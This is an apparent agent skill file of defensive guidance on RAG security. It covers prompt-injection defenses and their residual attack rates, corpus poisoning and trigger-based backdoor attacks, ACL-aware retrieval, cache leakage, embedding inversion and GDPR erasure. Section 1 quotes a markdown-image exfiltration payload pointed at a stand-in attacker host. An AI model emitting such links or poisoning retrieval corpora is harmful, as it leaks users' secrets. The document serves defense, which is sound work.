---
name: security
description: Depth layer for securing a retrieval system — trifecta scoping, indirect-injection defenses with their real residual ASR, corpus poisoning economics, ACL-aware retrieval and revocation, cache/tenant leakage, embedding inversion and PII, GDPR erasure, OWASP/EU AI Act. Load before shipping anything multi-tenant, permissioned, PII-bearing, or ingesting untrusted content; skip for a single-user demo over a corpus you wrote yourself.
---

# RAG Security

Two failure classes, unequal frequency. **Access control breaks far more often than injection** — it needs no attacker, just an ingestion job that ran with admin scope and dropped the source system's ACLs. Injection is the harder problem but the rarer incident. Budget accordingly.

Tiering: **stated as fact** = primary source (paper abstract, regulator text); **"reported"/"≈"** = one credible source; **"unverified"** = named as such.

## 1. Scoping the trifecta — what actually counts as an outbound leg

SKILL.md states the rule; here is where teams get the scoping wrong. An "outbound tool" is not just `send_email`. It is anything an attacker can use as a bit-channel out of the trust boundary:

- Markdown image/link rendering in your UI — the classic zero-click exfiltration (`![](https://attacker/?d=<secret>`). This is the leg most teams forget they have, because nobody registered the renderer as a tool.
- Any write path: ticket creation, Slack post, webhook, `git push`, a "save note" tool. Writes are exfiltration when someone else can read the destination.
- Trace/observability sinks the attacker can reach, and error messages that echo context to a third-party service.
- **Side channels survive even formal defenses.** CaMeL's authors document inferring a private value from whether a loop's iteration count triggers repeated external fetches, or from whether execution halts on a conditionally-triggered error. Bit-rate is low; for a 6-digit secret it is enough.

If you must keep an outbound leg: least-privilege the tool scope, require human approval on the irreversible ones, and allowlist egress destinations (a URL allowlist kills the markdown-image channel outright, where a classifier does not).

## 2. Indirect injection — the numbers are not comparable, and none reach zero

**Never compare ASR across papers.** The success *definition* alone swings results 2x+: task hijack vs. actual data exfiltration, base vs. "enhanced" attack prompts, static vs. adaptive red-teamer. Same system, three papers, three numbers.

| Setting | Number | Note |
|---|---|---|
| InjecAgent, ReAct GPT-4, base / +hacking prompt ([2403.02691](https://arxiv.org/abs/2403.02691)) | 24% / 47% ASR-valid | Prompt wording alone nearly doubles it |
| Same benchmark, ReAct Llama2-70B | >80% both settings | Model choice dominates the defense |
| Fine-tuned-to-resist GPT-4 / GPT-3.5, same benchmark | 7.1% / 8.4% ASR-valid | **But the data-transmission phase hits 100% once a hijack lands** — hijack rate is the whole game |
| Stricter threat model requiring real leakage (ICLR 2026 submission) | ~20% targeted ASR (Llama-4 17B peaks 40%) | Reported, unrefereed; shows the definition swing |
| Adaptive red-teaming (AgentVigil on AgentDojo) | reported 0.73–0.76 vs. 0.45–0.49 baseline attack | An adaptive attacker ≈1.5x's a static one. Your eval attacker is static. |

**Defenses, with residual risk:**

| Defense | Measured effect | The catch |
|---|---|---|
| **Spotlighting** ([2403.14720](https://arxiv.org/abs/2403.14720), Microsoft) | Abstract: ASR ">50% to below 2%". Datamarking: 3.10% (GPT-3.5) / 1.0% (GPT-4) on document QA, negligible quality cost | Delimiting *alone* only roughly halves a ~60% baseline — weak. Encoding (base64/ROT13) gets near 0% but is **capability-gated**: a weaker model decodes wrong and task quality collapses |
| **CaMeL** ([2503.18813](https://arxiv.org/abs/2503.18813)) — privileged planner + quarantined reader, capability/taint tracking in a sandboxed interpreter | Abstract: **77% of AgentDojo tasks solved with provable security vs. 84% undefended** | The widely-quoted "67% of attacks defended" is **unconfirmed** — it is not in the abstract; do not repeat it. Overhead reported ≈2.7–2.8x tokens (secondary source, not in abstract). Documented side channels remain |
| **PI detector / sanitizer** (CommandSans, [2510.08829](https://arxiv.org/abs/2510.08829)) | InjecAgent-enhanced GPT-4: 46.4% → **0.9%** with a detector, 14.2% with sanitization | Detection generalizes to known shapes, not the infinite rephrasing space; sanitization is 15x worse than detection here |
| **Instruction hierarchy** (OpenAI) | **unverified** — no ASR figure was confirmed | Real technique; cite no number for it |
| **Output-side guardrail LLM** | — | OWASP is explicit: a guardrail LLM is itself an LLM and is itself injectable. Defense-in-depth layer, never a sole control |

Structured channel separation (system/user/tool roles) degrades toward spotlighting-grade mitigation, not a guarantee — everything still collapses into one sequential token stream.

## 3. Corpus poisoning — cheap, and hybrid retrieval is the cheapest counter

| Attack | Budget | Result |
|---|---|---|
| **PoisonedRAG** ([2402.07867](https://arxiv.org/abs/2402.07867), USENIX Sec '25) | **5 documents** in a multi-million-doc store | 90% ASR, black- and white-box. Paper found existing defenses insufficient |
| **Phantom** ([2405.20485](https://arxiv.org/abs/2405.20485), ACM TOPS) | **1 document** | Retrieved only when a natural trigger token (e.g. a person's name) appears in the query, then jailbreaks |
| **BadRAG** ([2406.00083](https://arxiv.org/abs/2406.00083)) | 10 passages | 98.2% retrieval success on triggered queries; downstream GPT-4 reject-ratio attack 0.01% → **74.6%** |
| **AgentPoison** ([2407.12784](https://arxiv.org/abs/2407.12784)) | **<0.1% poison rate** | >80% ASR against agent memory / KB |

The design consequence: **ingestion allowlisting is a security control, not a data-quality nicety.** Five documents is below the noise floor of every content-quality heuristic you have. Require attested provenance per chunk for any web- or crowd-sourced corpus.

**Hybrid retrieval as a poisoning defense — real, bounded.** Semantic Chameleon ([2603.18034](https://arxiv.org/abs/2603.18034), n=50, 67,941-doc Security StackExchange corpus): pure vector co-retrieval 38.0% → **0% with BM25+vector hybrid**, no model or retriever change. Free, from a decision most teams already make for relevance. Three limits you must carry with the number:

1. An attacker who **jointly optimizes for sparse and dense signals** still lands 20–44%. The 0% is against an attacker who didn't try.
2. **Cross-corpus transfer failed**: the same attack scored 0% ASR across every configuration on FEVER Wikipedia (n=25). Attacks don't generalize across corpora — and neither, therefore, does the evidence for a defense validated on one.
3. Downstream success ranged **46.7%–93.3% by generator model** on the same poisoned context. Poisoning risk is a property of (corpus × retriever × generator), never the corpus alone. Re-test on model swap.

TrustRAG ([2501.00879](https://arxiv.org/abs/2501.00879)) reports 83.0% accuracy at 2.0% ASR under a 100% poisoning rate on Llama-3.1-8B — single paper, not independently reproduced.

## 4. Access control — the part that actually breaks

**Why post-filtering leaks before it runs.** Two distinct mechanisms, and the second is the one people miss:

- It breaks the *"ask for k, get k"* contract. Authorized users silently get fewer results, someone files a relevance bug, and the team "fixes" it by loosening the filter. The control erodes through UX pressure, not through a breach.
- **Leakage happens upstream of the filter.** Unfiltered candidates populate chunk metadata (document titles, department names, project codenames), reranker features, latency signals, and observability traces. Filtering the *content* at the end does not unwind any of that.

**When post-filter is nonetheless fine:** high positive-hit-rate corpora — most retrieved docs are ones the caller may see anyway. Post-filter becomes untenable as the corpus grows and the hit rate drops, because you burn most of k on candidates you throw away. That's the actual decision variable; "always pre-filter" is a slogan, hit-rate is the rule.

**Chunk-level vs document-level.** A document with a public summary and a confidential pricing annex, chunked under one blanket document-level ACL, exposes the annex to everyone who can see the summary. Permission boundaries must be tracked *through* chunking — a per-document ACL column is an assumption of uniformity, and long documents violate it routinely.

**Index-time vs late-binding — combine, don't choose.**

| | Index-time ACL (permissions in chunk metadata) | Late-binding (re-check candidates against the live source API) |
|---|---|---|
| Cost | Cheap, high-QPS | Extra round-trip; couples retrieval availability to the source system's uptime and rate limits |
| Staleness | Stale from the instant a group membership or classification changes until the next reindex — **often days** | None |
| Use when | High-QPS, lower sensitivity, frequent resync | High sensitivity, or fast-changing permissions (the hour after an offboarding) |

Recommended: index-time filter to narrow to a top 20–50 candidate set, then a batched late-binding check on just that set before generation. Practitioner guidance surveyed treats **neither layer alone as sufficient** for high-stakes deployments.

**The revocation-lag asymmetry.** Caching the authorized-ID list *before* retrieval (a `list-objects` pre-fetch) creates a window where a revoked permission still grants access until the cache expires. Per-candidate checks *after* retrieval have no such window — they ask "can this user see this document, right now" at the last possible moment. Prefer the latter when you have the choice, and never let the ID-list cache TTL exceed your offboarding SLA.

**ReBAC / Zanzibar: keep permissions out of the embeddings.** The strongest pattern found: vectors carry only a linking key (`article_id`); the vector store stores no who-can-see-what at all. Authorization resolves at query time against a relationship graph (SpiceDB-class). Deleting one relationship edge is reflected in the very next `LookupResources` — **no re-embedding, no reindex, no touching the vector store**, which structurally eliminates index-time staleness. Mechanics: `LookupResources` (get authorized ID set → pass as an `$in` metadata pre-filter) is heavier than `CheckPermission`; when checking many candidates use bulk-check, not serial per-candidate calls. A vendor case-study claim of 37B documents / 5M users at this pattern's scale is **not independently audited** — treat as existence proof, not benchmark.

Per-user namespace isolation is only sound for data with **no inherent sharing** (a user's own uploads). One shared "Company Vacation Policy.pdf" across a 100-person org means 100 replicas and a 100-way fan-out on every edit.

Whichever model you pick, you now own **permission freshness as infrastructure**: polling cursors (Dropbox `get_latest_cursor`-style) or change webhooks (Google Drive-style) against every connected source, for the life of the integration. A one-time sync is a dated snapshot of who could see what.

**NEVER derive a permission filter from client-supplied input.** WHY: a filter parameter the request body sets (the `custom_inputs.filters` shape found unflagged in a vendor ACL example) is not an access control — it is a client-suggested search narrowing that any caller can alter or simply omit. The filter value must be derived server-side from the authenticated session. This is the single most common "looks like ACL-aware retrieval, isn't" pattern in code samples.

## 5. Multi-tenancy and cache leakage

The mechanism SKILL.md names: **a cache hit skips the LLM call, and therefore skips that call's system prompt, per-request authorization context, and safety checks.** The cost/latency optimization is frequently the cheapest cross-tenant leak path in the system. Two distinct bug classes, needing different fixes:

1. **Key-collision poisoning.** CacheAttack ([2601.23088](https://arxiv.org/html/2601.23088v2)) reports an 86% hijack hit rate by searching for adversarial suffixes that induce false-positive cache-key collisions, reportedly transferable across embedding models — single, very recent paper; treat transferability as the weaker claim. Compounding factor: the poisoned response is *written* in one request and *served* in a later one, so any output check that runs only at generation time never sees it.
2. **Timing side channels.** KV-cache sharing in multi-tenant serving permits reconstructing other users' prompts by timing (NDSS). A RAG-specific extension ([2606.21842](https://arxiv.org/html/2606.21842v1)) argues that non-prefix chunk routing and selective recomputation — standard in engines that stitch disjoint chunks — inherently violate cross-tenant timing isolation at the fusion boundary.

Fixes: composite cache keys hashing the prompt vector **with** TenantID, UserRole, SecurityContext, model version, and system-prompt hash; short TTLs; no shared semantic cache at all for auth, finance, medical, tool-call, or private-data queries. Static similarity thresholds assume every query tolerates the same semantic slop — negation, numbers, dates, named entities, and permission language flip the correct answer while vectors stay close.

The circulating "95% / 100% of RAG apps leak across tenants" figure is **not empirical**: the 95% appears only in a Medium post's *title*, never restated, defined, or sourced in the body; 100% is an unsourced escalation of it. No peer-reviewed cross-tenant leakage rate exists. The failure mode is real; the rate is invented.

## 6. Embeddings and PII

**Inversion** (Vec2Text, [2310.06816](https://arxiv.org/abs/2310.06816), EMNLP '23): **≈92% exact recovery of 32-token passages** (BLEU ≈97.3) — exact full-sequence match on short passages, *not* "92% of tokens". From clinical embeddings: 94% first names, 95% last names, 89% full names. It needs **no model weights** — ≈5M text-embedding pairs from the target model, reported ≈2 days on 4×A6000. Robust to 8-bit quantization and mean-pooling; degrades under injected Gaussian noise. **Honest limit:** whether this holds at realistic RAG chunk lengths (256–1024 tokens) is **unverified** — that is the actual threat surface and nobody measured it. Any "100% recovery from embeddings" vendor claim is unsupported.

**Membership inference is a separate risk requiring separate mitigation.** Three distinct families — inversion (recover text), membership inference (was this record in the corpus), attribute inference (nationality, occupation). A defense tuned for inversion does not transfer. Attribute inference from *reconstructed* text reaches ≈0.94 accuracy, sometimes on par with running it on the original text; and embedding leakage persists into downstream tasks even when the embedding layer is never exposed. Noise injection (DPNR, metric-LDP Laplace mechanisms) is the dominant academic defense; a survey-reported ≈30% drop in inversion and ≈80% in attribute-inference success from adversarial training is a single unreproduced line.

**Mask before embedding vs. after retrieval — different threats, not tiers.**

| | Before embedding | After retrieval |
|---|---|---|
| Stops | Vector-store compromise, inversion, similarity probing | Output leakage to users and external endpoints |
| Reversibility | Hard — requires full re-embed + reindex | Easy — policy change |
| Retrieval-quality risk | High with naive redaction, low with consistent pseudonymization | None |

Before-embedding is the security-correct default; after-retrieval leaves the stored embeddings themselves non-compliant. **The recall objection is real but self-inflicted**: blanket nulling destroys the discriminative signal that made a chunk retrievable, recall tanks, and the team disables masking to fix the complaint — trading a compliance control for a relevance one. **Consistent format-preserving pseudonymization** (same entity → same surrogate every time, plausible type and shape) preserves query-document alignment; the improvement over blanket redaction is directional, never benchmarked in the sources surveyed. Pair with a separately access-controlled mapping vault for deanonymize-at-query when a caller is genuinely entitled.

**The shadow copy.** Observability and tracing tools capture full RAG inputs and outputs — **including retrieved context** — by default. Masking on the way into the model but not on the way into LangSmith-class traces yields a complete second copy of every sensitive document the system ever retrieved, typically behind weaker access control than the vector DB. This is where teams that "did the work" still leak.

## 7. Erasure

GDPR Art. 17 requires erasure without undue delay but **does not define what erasure means for an AI system**. EDPB Guidelines 05/2019 require it be **verifiable and irreversible**, which is what kills the tombstone pattern: suppressing a record from query results is a *functional* delete, while the vector can remain physically present and reconstructable on disk in an HNSW graph ([2606.18497](https://arxiv.org/abs/2606.18497)). Hard delete **plus index rebuild/compaction**. No commercial vector DB currently offers provable deletion.

What one delete request must actually touch: (1) chunk/document store; (2) vector index, hard + compacted; (3) semantic cache entries derived from it; (4) traces/logs that captured the retrieved chunk; (5) any fine-tune or distillation set that included it; (6) backups and snapshots of all of the above. Given inversion, treat embeddings of personal data **as** personal data — regulators are described as beginning to examine this; it is not settled, so assume the stricter reading.

**Fine-tune unlearning is unsolved, and that is a design input, not a caveat.** Contributions are entangled across parameters; you often cannot determine whether a given record affected the weights at all. Full retrain is accurate and doesn't scale to per-request erasure; gradient-ascent unlearning is fast with no removal guarantee and quality cost; SISA sharding is the closest to provable-and-efficient. ["Machine Unlearning Doesn't Do What You Think"](https://arxiv.org/abs/2412.06966) argues the techniques are oversold for policy purposes — "we ran unlearning" does not satisfy Art. 17. **Therefore: keep erasable personal data in the retrievable index and out of the fine-tune.** That is a real, underused reason to prefer RAG over fine-tuning for personal data, decided at design time when it is still free.

Prerequisite for all of it: **lineage**. You cannot honor an erasure request in an architecture that doesn't record which chunks, embeddings, cache entries, and log lines derive from which source record. Per-source namespacing turns erasure into a namespace operation instead of a search. Note that connector-level sync (e.g. removing the source object and re-running a Bedrock KB sync clears the derived vectors) does **not** sweep externally-stored session history — that needs its own path.

## 8. Standards, only where actionable

**OWASP Top 10 for LLM Apps 2025** added **LLM08:2025 Vector and Embedding Weaknesses** — the RAG-specific entry, covering vector-DB poisoning through legitimate query paths and weak vector-store access control across tenants. Prompt injection holds #1 for a second edition. The other RAG-load-bearing entries: LLM02 (sensitive information disclosure), LLM04 (data and model poisoning), LLM06 (excessive agency — the trifecta's third leg), LLM09 (misinformation: a confidently-sourced answer when retrieval quietly failed is *worse* than an obviously ungrounded one, because users trust it *because* it looks sourced). Category names and ranking are confirmed; OWASP's fuller category text was only available as teasers — don't quote it verbatim.

**EU AI Act, as of 2026-08-13.** Live **now**: Article 50 transparency obligations (machine-readable marking of AI-generated content, deep-fake disclosure, disclosure to people subject to emotion recognition/biometric categorization) — these bind *deployers*, not just model providers, so an in-house branded RAG chatbot is in scope. GPAI enforcement powers and the penalty regime also switched on 2 Aug 2026; the preceding year was compliance-on-paper without penalty exposure. Deferred by the Digital Omnibus (provisional agreement 7 May 2026): Annex III stand-alone high-risk 2 Aug 2026 → **2 Dec 2027**; Annex I product-embedded 2 Aug 2027 → 2 Aug 2028; Art. 50(2) legacy generative systems → 2 Dec 2026. The prohibited-practices ban (Feb 2025) and GPAI rules (Aug 2025) are unaffected. A widely-repeated "78% of organizations have taken no meaningful compliance steps" is **unverified** — recurring across trackers, primary survey untraced. For NIST AI RMF and ISO 42001, use them as governance scaffolding for the lineage and logging work above; RAG-specific technical mappings from either are **unverified** here.
